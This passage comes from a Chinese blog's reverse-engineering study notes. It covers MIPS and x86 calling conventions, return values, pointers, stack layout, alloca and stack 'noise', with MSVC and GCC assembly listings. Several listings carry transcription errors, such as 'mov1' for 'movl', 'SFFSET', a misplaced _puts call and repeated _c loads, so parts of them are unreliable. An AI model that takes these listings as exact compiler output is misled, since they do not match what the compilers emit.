class="line">; set b: </span><br><span class="line">.text:00000030 li		$a1, 2		; branch delay slot</span><br><span class="line">; result in $v0 now </span><br><span class="line">.text:00000034 lw		$gp, 0x20+var_10($sp)</span><br><span class="line">.text:00000038 lui		$a0, ($LC0 &gt;&gt; 16)</span><br><span class="line">.text:0000003C lw		$t9, (printf &amp; 0xFFFF)($gp)</span><br><span class="line">.text:00000040 la		$a0, ($LC0 &amp; 0xFFFF)</span><br><span class="line">.text:00000044 jalr		$t9</span><br><span class="line">; take result of f()		function and pass it as a second argument to printf():</span><br><span class="line">.text:00000048 move	$a1, $v0 ; branch delay slot</span><br><span class="line">.text:0000004C lw		$ra, 0x20+var_4($sp)</span><br><span class="line">.text:00000050 move	$v0, $zero</span><br><span class="line">.text:00000054 jr		$ra</span><br><span class="line">.text:00000058 addiu	$sp, 0x20		; branch delay slot</span><br></pre></td></tr></table></figure>
<p>MIPS参数传递会用<code>$a0 - $a3</code>这四个寄存器。<br>MIPS平台有两个特殊的寄存器:<code>HI </code>和 <code>LO</code>。它们用来存储MULT指令的乘法计算结果——<code>64位的积</code>。 只有 <code>MFLO</code> 和 <code>MFHI</code> 指令能够访问 HI 和 LO 寄存器。其中，MFLO 负责访问积的低 32 位部分。本例中它把积的低 32 位部分存储到<code>$V0 </code>寄存器。<br>因为本例没有访问积的高 32 位，所以那半部分被丢弃了。不过我们的程序的积是 32 位的整型数据。<br>最终 <code>ADDU(Add Unsigned)</code>指令计算第三个参数与积的和。<br>在MIPS平台上，<code>ADD</code>和<code>ADDU</code>是两个不同的指令。此二者的区别体现在<code>异常处理</code>的方式上，而符号位的处理方式反而没有区别。ADD指令可以触发<code>溢出处理</code>机制。溢出有时候是必要的，而且被Ada和其他编程语言支持。ADDU不会引发溢出。因为C&#x2F;C++不支持这种机制，所以本例使用的是ADDU指令而非ADD指令。</p>
<p>此后<code>$V0 </code>寄存器存储这 32 位的运算结果。</p>
<p>main()函数使用到了<code> JAL(Jump and Link)</code>指令。JAL 和 JALR 指令有所区别，前者使用的是<code>相对地址—— 偏移量</code>，后者则跳转到寄存器存储的绝对地址里。JALR 的 R 代表 Register。由于 f()函数和 main()函数都位于同一个 object 文件，所以 f()函数的相对地址是已知的，可以被计算出来。</p>
<h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>在x86系统里，被调用方函数通常通过<code>EAX</code>寄存器返回运算结果。若返回值属于byte或char类型数据，返回值将存储于EAX寄存器的低 8 位——<code>AL</code>寄存器存储返回值。如果返回值是浮点float型数据，那么返回值将存储在FPU的 <code>ST(0)</code>寄存器里。ARM系统的情况相对简单一些，它通常使用<code>R0 </code>寄存器回传返回值。</p>
<h3 id="void型函数的返回值"><a href="#void型函数的返回值" class="headerlink" title="void型函数的返回值"></a>void型函数的返回值</h3><p>主函数 main()的数据类型通常是 void 而不是 int，调用 main()函数的有关代码大体会是这样的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push envp </span><br><span class="line">push argv </span><br><span class="line">push argc </span><br><span class="line">call main </span><br><span class="line">push eax </span><br><span class="line">call exit</span><br></pre></td></tr></table></figure>
<p>将其转换为源代码，也就是<code>exit(main(argc,argv,envp));</code><br>如果声明 main()的数据类型是 void，则 main()函数不会明确返回任何值(没有 return 指令)。不过在 main()函数退出时，EAX 寄存器还会存有数据，EAX 寄存器保存的数据会被传递给 exit()函数、成为后者的输入参数。通常 EAX 寄存器的值会是被调用方函数残留的确定数据，所以 void 类型函数的返回值、也就是主函数退出代码往往属于<code>伪随机数(pseudorandom)</code>。</p>
<p>例如下面的程序：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;hello, world!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在main()函数结束时，EAX寄存器的值不会是零，应当是上一个函数——puts()函数的返回值。</p>
<h3 id="函数返回值不被调用的情况"><a href="#函数返回值不被调用的情况" class="headerlink" title="函数返回值不被调用的情况"></a>函数返回值不被调用的情况</h3><p>例如如下程序：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">f</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">rand</span>();</span><br><span class="line">	<span class="built_in">rand</span>();</span><br><span class="line">	<span class="built_in">rand</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">rand</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述四个rand()函数都会把运算结果存储到EAX寄存器里，但是前三个rand()函数留在EAX寄存器的运算结果都被抛弃了。</p>
<h3 id="返回值为结构体型数据"><a href="#返回值为结构体型数据" class="headerlink" title="返回值为结构体型数据"></a>返回值为结构体型数据</h3><p>函数只能够使用 EAX 这 1 个寄存器回传返回 值。因为这种局限，过去的 C 编译器无法编译返回值超过 EAX 容量(一般来说，就是 int 型数据)的函 数。那个时候，如果要让返回多个返回值，那么只能用函数返回一个值、再通过指针传递其余的返回值。 现在的 C 编译器已经没有这种短板了，return 指令甚至可以返回结构体型的数据，只是时下很少有人会这 么做。如果函数的返回值是大型结构的数据，那么应由调用方函数(caller)负责分配空间，给结构体分配 指针，再把指针作为第一个参数传递给被调用方函数。现在的编译器已经能够替程序员自动完成这种复杂 的操作了，其处理方式相当于上述几个步骤，只是编译器隐藏了有关操作。<br>调用方函数(caller)创建数据结构、分配数据空间，被调用的函数仅向结构体填充数据。<br>其效果等同于返回结构体。这种处理方法并不会影响程序性能。</p>
<h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><h3 id="全局变量、局部变量"><a href="#全局变量、局部变量" class="headerlink" title="全局变量、局部变量"></a>全局变量、局部变量</h3><p>全局：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">f1</span><span class="params">( <span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> *sum, <span class="type">int</span> *product)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	*sum = x+y;</span><br><span class="line">	*product = x*y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> sum, product;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">f1</span>(<span class="number">123</span>,<span class="number">456</span>,&amp;sum,&amp;product);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;sum=%d, product=%d\n&quot;</span>, sum, product);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>数据传递过程如下：<br><img src="/images/2dafc9dd1817ec6d0abefc90ac50b9d649884ae4.png" alt="屏幕快照 2017-12-11 下午12.05.07.png"><br>局部：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> sum, product; <span class="comment">// now variables are local in this function</span></span><br><span class="line">	<span class="built_in">f1</span>(<span class="number">123</span>,<span class="number">456</span>,&amp;sum,&amp;product);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;sum=%d, product=%d\n&quot;</span>, sum, product);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>数据传递过程如下：<br><img src="/images/573d76d43e38cff66ac6337d31ccb75b7fb13e99.png" alt="屏幕快照 2017-12-11 下午12.02.06.png"></p>
<h2 id="GOTO语句"><a href="#GOTO语句" class="headerlink" title="GOTO语句"></a>GOTO语句</h2><p>GOTO语句在反汇编后得到的命令是<code>jmp</code>，无条件跳转指令。</p>
]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title>逆向工程——栈</title>
    <url>/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%A0%88.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>栈是计算机科学李最重要的且最基础的<code>数据结构</code>之一。<br>从技术上讲，栈就是CPU寄存器里面的某个指针所指向的一片内存区域。这里所说的<code>某个指针</code>通常位于x86&#x2F;x64平台的<code>ESP寄存器/RSP寄存器</code>，以及ARM平台的<code>SP寄存器</code>。<br>操作站最常见的指令是<code>PUSH</code>和<code>POP</code>，在 x86 和 ARM Thumb 模式的指令集里都有这两条指令。<br><code>PUSH指令</code>会对ESP&#x2F;RSP&#x2F;SP寄存器的值进行<code>减法运算</code>，使之<code>减去4(32位）或8(64位</code>），然后将操作数写到上述寄存器里的指针所指向的内存中。<br><code>POP指令</code>是PUSH的逆操作：他先从栈指针（Stack Pionter,上面三个寄存器之一）指向的内存中读取数据，用以备用（通常是写到其他寄存器里面），然后再将栈指针的数值<code>加上4或8</code>.<br>在分配栈的空间之后，栈指针，即Stack Pointer所指向的地址是栈的底部。PUSH将减少栈指针的数值，而POP会增加它的数值。栈的“底”实际上使用的是整个栈的最低地址，即是整个栈的启始内存地址。<br>ARM的栈分为递增栈和递减栈。递减栈（descending stack)的首地址是栈的最高地址，栈向低地址增长，栈指针的值随栈的增长而减少，如STMFA&#x2F;LMDFA、STMFD&#x2F;LDMFD、STMED、LDMEA等指令，都是递增栈的操作指令。</p>
<h3 id="栈的用途"><a href="#栈的用途" class="headerlink" title="栈的用途"></a>栈的用途</h3><h4 id="保存函数结束时的返回地址"><a href="#保存函数结束时的返回地址" class="headerlink" title="保存函数结束时的返回地址"></a>保存函数结束时的返回地址</h4><h5 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h5><p>当程序使用call指令调用其他函数时，call指令结束后的返回地址将被保存到栈里，在call所调用的函数结束之后，程序将执行无条件跳转指令，跳转到这个返回地址。<br>call指令等价于“PUSH返回地址”和“JMP函数地址”的指令对<br>被调用函数里的RET指令，会从栈中读取返回地址，然后跳转到这个这个地址，就相当于“POP返回地址”+“JMP返回地址”指令。<br>栈是有限的，溢出它很容易。直接使用无线递归，栈就会满：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	f();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果使用MSVC2008编译上面的问题程序，就会得到报告：<br>​	<br>​	c:\tmp6&gt;cl ss.cpp &#x2F;Fass.asm<br>​	Microsoft (R) 32-bit C&#x2F;C++ Optimizing Compiler Version 15.00.21022.08 for 80x86<br>​	Copyright (C) Microsoft Corporation. All rights reserved.<br>​	ss.cpp<br>​	c:\tmp6\ss.cpp(4) : warning C4717:’f’ : recursive on all control paths. Function will cause runtime stack overflow<br>但它还是会生成汇编文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f@@YAXXZ PROC              ; f</span><br><span class="line">; File c:\tmp6\ss.cpp</span><br><span class="line">; Line 2</span><br><span class="line">	push ebp</span><br><span class="line">	mov ebp, esp</span><br><span class="line">; Line 3</span><br><span class="line">	call ?f@@YAXXZ         ; f</span><br><span class="line">; Line 4</span><br><span class="line">	pop ebp</span><br><span class="line">	ret 0</span><br><span class="line">?f@@YAXXZ ENDP                 ; f</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>有趣的是,如果打开优化选项“&#x2F;Ox”,生成的程序反而不会出现栈溢出的问题,而且还会运行得很“好”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f@@YAXXZ PROC                    ; f</span><br><span class="line">; File c:\tmp6\ss.cpp</span><br><span class="line">; Line 2</span><br><span class="line">$LL3@f:</span><br><span class="line">; Line 3</span><br><span class="line">	jmp SHORT $LL3@f</span><br><span class="line">?f@@YAXXZ ENDP                    ; f </span><br></pre></td></tr></table></figure>
<p>无论是否开启优化选项,GCC 4.4.1 生成的代码都和 MSVC 生成的代码相似,只是 GCC 不会发布任何警告。</p>
<h5 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h5><p>ARM程序也使用栈保存返回地址，只是略有不同。之前课程中我们看到“hello world”程序的返回地址保存在<a href="https://baike.baidu.com/item/LR/17186721?fr=aladdin">LR寄存器</a>里。但是如果程序还会继续调用其它函数，就需要在调用函数之前保存LR寄存器里面的值。通常函数会在启动过程中（序言处）保存LR寄存器的值。我们同通常在函数序言中看到<code>PUSH R4-R7,LR</code>,并在尾声处看到<code>POP R4-R7,PC</code>。这些指令会对函数自身将要用到的寄存器进行保护，把它们的值存放到栈中————当然，这其中也包括LR寄存器<br>如果一个函数不调用其它函数，它就像书上枝杈末端的叶子一样，这种函数被叫做<code>叶函数（leaf function）</code>。叶函数的特点是：它不必保存LR寄存器的值。如果叶函数的代码短到用不到几个寄存器,那么它也可能根本不会使用数据栈。所以调用叶函数的时候确实可能不会涉及栈操作。由于这种代码不在外部内存RAM进行与栈有关的操作,所以它的运行速度有可能超过x86 系统，在没有分配栈或者不可能用栈的时候,这类函数就会显现出“寸有所长”的优势。</p>
<h4 id="参数的传递"><a href="#参数的传递" class="headerlink" title="参数的传递"></a>参数的传递</h4><p>在x86 平台的程序中,最常用的参数传递约定是cdecl 。以cdecl方式处理参数,其上下文大体是这个样子:<br>​	<br>​	push arg3<br>​	push arg2<br>​	push arg1<br>​	call f<br>​	add esp,12 4*3&#x3D;12<br>被调用方函数（Callee functiongs)通过栈指针获取其所需的参数。<br>在运行f()函数之前，传递给他的参数将以以下格式存储到内存里：</p>
<table>
<thead>
<tr>
<th align="center">ESP</th>
<th align="center">返回地址</th>
</tr>
</thead>
<tbody><tr>
<td align="center">ESP+4</td>
<td align="center">arg1,它在IDA里面记为arg0</td>
</tr>
<tr>
<td align="center">ESP+8</td>
<td align="center">arg2,它在IDA里面记为arg4</td>
</tr>
<tr>
<td align="center">ESP+0xC</td>
<td align="center">arg4,它在IDA里面记为arg8</td>
</tr>
</tbody></table>
<p>相关的调用约定会在之后的课件中介绍，需要注意的是，程序员可以使用栈来传递参数，也可以不使用栈来传递参数。参数处理方面并没有相关的硬性规定。<br>例如，程序员可以在堆（heap）中分配内存并用之传递参数。在堆中放入参数之后,可以利用EAX寄存器为函数传递参数。这种做法确实行得通。只是在x86 系统和ARM系统上,使用栈处理参数已经成为了约定俗成的习惯,而且它的确十分方便。另外,被调用方函数并不知晓外部向它传递了多少个参数。如果函数可处理的参数数量可变,它就需<br>要说明符(多数以%号开头)进行格式化说明、明确参数信息。拿我们常见的 printf()函数来说:<code>printf(&quot;%d %d %d&quot;, 1234);</code>，这个命令不仅会让 printf()显示 1234,而且还会让它显示数据栈内 1234 之后的两个地址的随机数。<br>由此可知,声明 main()函数的方法并不是那么重要。我们可以将之声明为 main(),main(int argc, char<br>*argv[])或 main(int argc, char *argv[], char *envp[])。<br>实际上 CRT 中调用 main()的指令大体上是下面这个样子的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push envp</span><br><span class="line">push argv</span><br><span class="line">push argc</span><br><span class="line">call main</span><br><span class="line">-</span><br></pre></td></tr></table></figure>
<p>即使我们没有在程序里声明 main()函数便用哪些参数,程序还可以照常运行;参数依旧保存在栈里,只是不会被主函数调用罢了。如果将 main()函数声明为main(int argc,char*argv[]),程序就能够访问到前两个参数,但仍然无法使用第三个参数。除此以外,也可以声明为 main( int argc),主函数同样可以运行。</p>
<h4 id="存储局部变量"><a href="#存储局部变量" class="headerlink" title="存储局部变量"></a>存储局部变量</h4><p>通过向栈底调整栈指针的方法，函数即可在数据栈里分配出一片可用于存储局部变量的内存空间。可见，无论函数声明了多少个变量，都不影响它分配栈空间的速度。<br>虽然可以在栈外的任何地方存储局部变量，但是用数据栈来存储局部变量已经是一种约定俗成的习惯了。</p>
<h4 id="x86：alloca-函数"><a href="#x86：alloca-函数" class="headerlink" title="x86：alloca()函数"></a>x86：alloca()函数</h4><p>alloca（0函数直接使用栈来分配内存，除此之外，它与<a href="http://blog.csdn.net/msdnwolaile/article/details/51695361">malloc()</a>函数没有显著的区别.<br>函数尾声的代码还会还原ESP的值，把数据栈还原为函数启动之前的状态，直接抛弃由alloca（）函数分配的内存，所以程序不需要特地使用free函数来释放由这个函数申请的内存。<br>alloca()函数将以所需数据空间的大小为幅度、向栈底调整ESP的值，此时ESP就成了新的数据空间的指针：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#ifdef __GNUC__</span><br><span class="line">#include &lt;alloca.h&gt; // GCC</span><br><span class="line">#else</span><br><span class="line">#include &lt;malloc.h&gt; // MSVC</span><br><span class="line">#endif</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void f()</span><br><span class="line">&#123;</span><br><span class="line">char *buf=(char*)alloca (600);</span><br><span class="line">#ifdef __GNUC__</span><br><span class="line">snprintf (buf, 600, &quot;hi! %d, %d, %d\n&quot;, 1, 2, 3); // GCC</span><br><span class="line">#else</span><br><span class="line">_snprintf (buf, 600, &quot;hi! %d, %d, %d\n&quot;, 1, 2, 3); // MSVC</span><br><span class="line">#endif</span><br><span class="line">puts (buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>snprint（）函数的功能和printf（0函数的功能差不多。prinf函数将输出结果输出到stdout（也就是终端terminal或console一类的输出设备上），而snprintf（）则将结果输出到buf数组（人工设定的缓冲区）、我们需要通过puts（）函数才能将buf的内容输出到stdout。当然printf（）函数就足以完成_snprintf（）和1puts（）两个函数的功能。主要为了演示缓冲区的用法，所以才可以将它拆分为两个函数。<br><strong>MSVC</strong><br>现在使用 MSVC 2010 编译上面的代码,得到的代码段如下所示。<br>指令清单 5.1 MSVC 2010</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">	mov eax,600      ;00000258H</span><br><span class="line">	call __alloca_probe_16</span><br><span class="line">	mov esi,esp</span><br><span class="line">	push 3</span><br><span class="line">	push 2</span><br><span class="line">	push 1</span><br><span class="line">	push SFFSET $SG2672</span><br><span class="line">	push 600          ;00000258H</span><br><span class="line">	push esi</span><br><span class="line">	call _puts</span><br><span class="line">	add esp,28        ;000001cH</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>由于alloca()函数是编译器固有函数，并非常规函数的缘故，这个程序并没有使用栈，而是使用EAX寄存器来传递alloca（）函数唯一的参数。在调用alloca()寒素之后，ESP将指向600字节大小的内存区域，用以存储数组buf。<br><strong>GCC Intel语体</strong><br>在编译上述代码时，GCC 4.4.1 同样不会调用外部函数<br>指令清单 5.2 GCC 4.7.3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.LC0:</span><br><span class="line">	.string &quot;hi!%d,%d,%d\n&quot;</span><br><span class="line">f:</span><br><span class="line">	pushebp</span><br><span class="line">	mov ebp,esp</span><br><span class="line">	push ebx</span><br><span class="line">	sub esp,660</span><br><span class="line">	lea ebx,[esp+39]</span><br><span class="line">	and ebx,-16               ;align pointer by 16-bit border</span><br><span class="line">	mov DWORD PTR [esp],ebx   ;s</span><br><span class="line">	mov DWORD PTR [esp+20],3</span><br><span class="line">	mov DWORD PTR [esp+16],2</span><br><span class="line">	mov DWORD PTR [esp+12],1</span><br><span class="line">	mov DWORD PTR [esp+8],OFFSET FLAT:.LCO ;&quot;hi! %d,%d,%d\n&quot;</span><br><span class="line">	mov DWORD PTR [esp+4],600  ;maxlen</span><br><span class="line">	call _snprintf</span><br><span class="line">	mov DWORD PTR [esp],ebx    ;s</span><br><span class="line">	call puts</span><br><span class="line">	mov ebx,DWORD PTR [esp-4]</span><br><span class="line">	leave</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
<p><strong>GCC+ AT&amp;T语体</strong><br>我们来看看AT&amp;T语体的指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.LC0:</span><br><span class="line">	.string &quot;hi! %d, %d, %d\n&quot;</span><br><span class="line">f:</span><br><span class="line">	push1 %ebp</span><br><span class="line">	mov1 %esp, %ebp</span><br><span class="line">	push1 %ebx</span><br><span class="line">	sub1 $660, %esp</span><br><span class="line">	lea1 39(%esp), %ebx</span><br><span class="line">	and1 $-16, %ebx</span><br><span class="line">	mov1 %ebx, (%esp)</span><br><span class="line">	mov1 $3, 20(%esp)</span><br><span class="line">	mov1 $2, 16(%esp)</span><br><span class="line">	mov1 $1, 12(%esp)</span><br><span class="line">	mov1 $.LC0, 8(%esp)</span><br><span class="line">	mov1 $600, 4(%esp)</span><br><span class="line">	call _snprintf</span><br><span class="line">	mov1 %ebx, (%esp)</span><br><span class="line">	call puts</span><br><span class="line">	mov1 -4(%ebp), %ebx</span><br><span class="line">	leave</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>

<p>它与Intel语体的代码没有实质区别<br>其中，<code>movl $3, 20(%esp)</code>对应 Intel 语体的<code>mov DWORD PTR [esp+20], 3</code>指令。在以“寄存器+偏移量”的方式寻址时,AT&amp;T 语体将这个寻址表达式显示为<code>偏移量(%寄存器)</code>。</p>
<h3 id="Windows-SEH-结构化异常处理"><a href="#Windows-SEH-结构化异常处理" class="headerlink" title="(Windows)SEH 结构化异常处理"></a>(Windows)SEH 结构化异常处理</h3><p>如果程序里存在 SEH 记录,那么相应记录会保存在栈里。</p>
<h3 id="典型的栈的内存存储格式"><a href="#典型的栈的内存存储格式" class="headerlink" title="典型的栈的内存存储格式"></a>典型的栈的内存存储格式</h3><p>在 32 位系统中,在程序调用函数之后、执行它的第一条指令之前,栈在内存中的存储格式一般如下表所示。</p>
<table>
<thead>
<tr>
<th align="center">…</th>
<th align="center">…</th>
</tr>
</thead>
<tbody><tr>
<td align="center">ESP-0xC</td>
<td align="center">第 2 个局部变量,在 IDA 里记为 var_8</td>
</tr>
<tr>
<td align="center">ESP-8</td>
<td align="center">第 1 个局部变量,在 IDA 里记为 var_4</td>
</tr>
<tr>
<td align="center">ESP-4</td>
<td align="center">保存的 EBP 值</td>
</tr>
<tr>
<td align="center">ESP</td>
<td align="center">返回地址</td>
</tr>
<tr>
<td align="center">ESP+4</td>
<td align="center">arg1, 在 IDA 里记为 arg_0</td>
</tr>
<tr>
<td align="center">ESP+8</td>
<td align="center">arg2, 在 IDA 里记为 arg_4</td>
</tr>
<tr>
<td align="center">ESP+0xC</td>
<td align="center">arg3, 在 IDA 里记为 arg_8</td>
</tr>
<tr>
<td align="center">…</td>
<td align="center">…</td>
</tr>
</tbody></table>
<h3 id="栈的噪音"><a href="#栈的噪音" class="headerlink" title="栈的噪音"></a>栈的噪音</h3><p>本书会经常使用<code>噪音</code>、<code>脏数据</code>这些词汇。它们怎么产生的呢?待函数退出以后,原有栈空间里<br>的局部变量不会被自动清除。它们就成为了栈的“噪音”、<br>“脏数据”。我们来看下面这段代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void f1()</span><br><span class="line">&#123;</span><br><span class="line">	int a=1, b=2, c=3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void f2()</span><br><span class="line">&#123;</span><br><span class="line">	int a,b,c;</span><br><span class="line">	printf(&quot;%d,%d,%d\n&quot;,a,b,c);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	f1();</span><br><span class="line">	f2();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用MSVC2010编译后可以得到如下所示的代码<br>指令清单 5.4 Non-optimizing MSVC 2010：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$SG2752 DB &#x27;%d, %d, %d&#x27;, 0aH, 00H</span><br><span class="line">_c$ = -12         ;size=4</span><br><span class="line">-b$ = -8          ;size=4</span><br><span class="line">-a$ = -4          ;size=4</span><br><span class="line">_f1 PROC</span><br><span class="line">	push ebp</span><br><span class="line">	mov ebp,esp</span><br><span class="line">	sub esp,12</span><br><span class="line">	mov DWORD PTR _a$[ebp],1</span><br><span class="line">	mov DWORD PTR _b$[ebp],2</span><br><span class="line">	mov DWORD PTR _c$[ebp],3</span><br><span class="line">	mov esp,ebp</span><br><span class="line">	pop ebp</span><br><span class="line">	ret 0</span><br><span class="line">_f1 ENDP</span><br><span class="line">	</span><br><span class="line">_c$ = -12            ;size=4</span><br><span class="line">_b$ = -8             ;size=4</span><br><span class="line">_a$ = -4             ;size=4</span><br><span class="line">_f2 PROC</span><br><span class="line">	push ebp</span><br><span class="line">	mov ebp,esp</span><br><span class="line">	sub esp,12</span><br><span class="line">	mov eax,DWORD PTR _c$[ebp]</span><br><span class="line">	push eax</span><br><span class="line">	mov ecx,DWORD PTR _c$[ebp]</span><br><span class="line">	push ecx</span><br><span class="line">	mov edx,DWORD PTR _c$[ebp]</span><br><span class="line">	push edx</span><br><span class="line">	push OFFSET $SG2752   ;&quot;%d,%d,%d&quot;</span><br><span class="line">	call DWORD PTR __imp__printf</span><br><span class="line">	add esp,16</span><br><span class="line">	mov esp,ebp</span><br><span class="line">	pop ebp</span><br><span class="line">	ret 0</span><br><span class="line">_f2 ENDP</span><br><span class="line"></span><br><span class="line">main PROC</span><br><span class="line">	push ebp</span><br><span class="line">	mov ebp,esp</span><br><span class="line">	call _f1</span><br><span class="line">	call _f2</span><br><span class="line">	xor eax,eax</span><br><span class="line">	pop ebp</span><br><span class="line">	ret 0</span><br><span class="line">_main ENDP</span><br></pre></td></tr></table></figure>
<p>编译器会给出提示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:\Polygon\c&gt;cl st.c /Fast.asm /MD</span><br><span class="line">Microsoft (R) 32-bit C/C++ Optimizing Compiler Version 16.00.40219.01 for 80x86</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line">st.c</span><br><span class="line">c:\polygon\c\st.c(11) : warning C4700: uninitialized local variable &#x27;c&#x27; used</span><br><span class="line">c:\polygon\c\st.c(11) : warning C4700: uninitialized local variable &#x27;b&#x27; used</span><br><span class="line">c:\polygon\c\st.c(11) : warning C4700: uninitialized local variable &#x27;a&#x27; used</span><br><span class="line">Microsoft (R) Incremental Linker Version 10.00.40219.01</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line">/out:st.exe</span><br><span class="line">st.obj</span><br></pre></td></tr></table></figure>
<p>可是运行它的结果却是:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:\Polygon\c&gt;st</span><br><span class="line">1, 2, 3</span><br></pre></td></tr></table></figure>
<p>f2()函数的三个变量的地址,和 f1()函数的三个变量的<code>地址相同</code>。因为没有对这个空间进行重新赋值,所以那三个变量会因为地址相同的原因获得前三个变量的值。<br>在这个特例里,第二个函数在第一个函数之后执行,而第二个函数变量的地址和 SP 的值又与第一个函数的情况相同。所以,相同地址的变量获得的值相同。<br>总而言之,在运行第二个函数时,栈中的所有值(即内存中的单元)受前一个函数的影响,而获得了前一个函数的变量的值。严格地说,这些地址的值不是随机值,而是可预测的伪随机值。<br>我们可以在每个函数执行之前清除其开辟的栈空间的数据。不过,即使这是一种技术上可行的方法,但是因为这种方法开销太大、而且必要性很低,所以没有人这样做。</p>
<h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><p>学习笔记</p>
]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title>逆向工程——汇编基础（一）</title>
    <url>/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%80%EF%BC%89.html</url>
    <content><![CDATA[<p>参考文档：《简明 x86 汇编语言教程》作者：司徒彦南</p>
<h2 id="什么是汇编"><a href="#什么是汇编" class="headerlink" title="什么是汇编"></a>什么是汇编</h2><p>汇编语言是一种最接近计算机核心的编码语言。不同于任何高级语言，汇编语言几乎可以完全和机器语言一一对应。<br>汇编语言就是机器语言的一种可以被人读懂的形式，只不过它更容易记忆。</p>
<h2 id="学习汇编语言，你需要"><a href="#学习汇编语言，你需要" class="headerlink" title="学习汇编语言，你需要"></a>学习汇编语言，你需要</h2><p>1。 胆量。不要害怕去接触那些计算机内部工作机制。<br>2。 知识。了解计算机常用的数制，特别是二进制、十六进制、八进制，以及计算机保存数据的方法。<br>3。 开放。接受汇编语言与高级语言的差异，而不是去指责它如何的不好读。<br>4。 经验。要求你拥有任意其他编程语言的一点点编程经验。<br>5。 头脑。脑子是个好东西。</p>
<h2 id="认识处理器"><a href="#认识处理器" class="headerlink" title="认识处理器"></a>认识处理器</h2><p>汇编语言被编译成机器语言之后，将有处理器（CPU）来执行。</p>
<h3 id="典型处理器的主要任务"><a href="#典型处理器的主要任务" class="headerlink" title="典型处理器的主要任务"></a>典型处理器的主要任务</h3><p>1。 从内存中获取机器语言指令，译码，执行。<br>2。 根据指令代码管理它自己的寄存器。<br>3。 根据指令或自己的需要修改内存的内容。<br>4。 响应其他硬件的中断请求。</p>
